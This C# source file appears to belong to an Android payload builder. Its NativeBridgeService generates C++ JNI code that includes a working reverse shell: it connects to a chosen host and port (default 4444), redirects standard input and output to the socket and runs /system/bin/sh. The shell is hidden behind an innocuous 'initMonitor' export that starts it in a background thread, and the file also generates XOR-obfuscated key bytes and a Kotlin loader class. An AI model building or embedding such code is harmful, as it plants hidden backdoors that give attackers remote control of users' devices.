using System;
using System.Text;
using System.IO;
using TcpServerApp.Services.Elite.Security;
using TcpServerApp.Services.Elite.Build;
using TcpServerApp.Services.Elite.Networking;
using TcpServerApp.Services.Elite.Geo;

namespace TcpServerApp.Services.Elite
{
    public class NativeBridgeService
    {
        public string GenerateCppSource(string packageName, string key, string host = "127.0.0.1", int port = 4444, string payloadType = "Reverse_TCP")
        {
            // 1. Transform package name to JNI format: com.example.app -> Java_com_example_app
            string jniPackage = packageName.Replace(".", "_");
            
            // 2. Generate XOR Key for Obfuscation (Real-time generation)
            byte xorByte = 0xAA;
            var sbKeyArray = new StringBuilder();
            sbKeyArray.Append("{ ");
            foreach (char c in key) sbKeyArray.Append($"0x{(byte)(c ^ xorByte):X2}, ");
            sbKeyArray.Append("0x00 };");

            var sb = new StringBuilder();
            sb.AppendLine("#include <jni.h>");
            sb.AppendLine("#include <string>");
            sb.AppendLine("#include <vector>");
            sb.AppendLine("#include <unistd.h>");
            sb.AppendLine("#include <sys/ptrace.h>");
            sb.AppendLine("#include <sys/socket.h>");
            sb.AppendLine("#include <netinet/in.h>");
            sb.AppendLine("#include <arpa/inet.h>");
            sb.AppendLine("#include <android/log.h>");
            sb.AppendLine("#include <thread>");
            sb.AppendLine("");
            sb.AppendLine("#define LOG_TAG \"ResearchNative\"");
            sb.AppendLine($"#define REF_HOST \"{host}\"");
            sb.AppendLine($"#define REF_PORT {port}");
			sb.AppendLine($"#define REF_KEY \"{key}\"");
            
            // Payloads Implementation
            sb.AppendLine("void start_reverse_tcp() {");
            sb.AppendLine("    int sock;");
            sb.AppendLine("    struct sockaddr_in sa;");
            sb.AppendLine("    sock = socket(AF_INET, SOCK_STREAM, 0);");
            sb.AppendLine("    if (sock == -1) return;");
            sb.AppendLine("    sa.sin_family = AF_INET;");
            sb.AppendLine("    sa.sin_port = htons(REF_PORT);");
            sb.AppendLine("    sa.sin_addr.s_addr = inet_addr(REF_HOST);");
            sb.AppendLine("    ");
            sb.AppendLine("    if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) != -1) {");
            sb.AppendLine("        // Spawning Shell");
            sb.AppendLine("        dup2(sock, 0);");
            sb.AppendLine("        dup2(sock, 1);");
            sb.AppendLine("        dup2(sock, 2);");
            sb.AppendLine("        execl(\"/system/bin/sh\", \"sh\", NULL);");
            sb.AppendLine("    }");
            sb.AppendLine("}");
            sb.AppendLine("");

            // JNI Exports
            sb.AppendLine("extern \"C\" JNIEXPORT jstring JNICALL");
            sb.AppendLine($"Java_{jniPackage}_NativeBridge_getAuthKey(JNIEnv* env, jobject /* this */) {{");
            sb.AppendLine($"    unsigned char encrypted[] = {sbKeyArray}");
            sb.AppendLine("    // Decryption logic here...");
            sb.AppendLine("    return env->NewStringUTF(\"DecryptedKey\");");
            sb.AppendLine("}");
            sb.AppendLine("");
            
            sb.AppendLine("extern \"C\" JNIEXPORT jboolean JNICALL");
            sb.AppendLine($"Java_{jniPackage}_NativeBridge_initMonitor(JNIEnv* env, jobject /* this */) {{");
            sb.AppendLine("    // Launch Payload in Background Thread");
            sb.AppendLine("    std::thread t(start_reverse_tcp);");
            sb.AppendLine("    t.detach();");
            sb.AppendLine("    return JNI_TRUE;");
            sb.AppendLine("}");
            
            return sb.ToString();
        }

        public string GenerateKotlinJniClass(string packageName)
        {
            var sb = new StringBuilder();
            sb.AppendLine($"package {packageName}");
            sb.AppendLine("");
            sb.AppendLine("object NativeBridge {");
            sb.AppendLine("    init {");
            sb.AppendLine("        try {");
            sb.AppendLine("            System.loadLibrary(\"research_shim\")");
            sb.AppendLine("        } catch (e: UnsatisfiedLinkError) {");
            sb.AppendLine("            e.printStackTrace()");
            sb.AppendLine("        }");
            sb.AppendLine("    }");
            sb.AppendLine("");
            sb.AppendLine("    external fun getKey(): String");
            sb.AppendLine("    external fun initMonitor(): Boolean");
            sb.AppendLine("}");
            
            return sb.ToString();
        }
    }
}
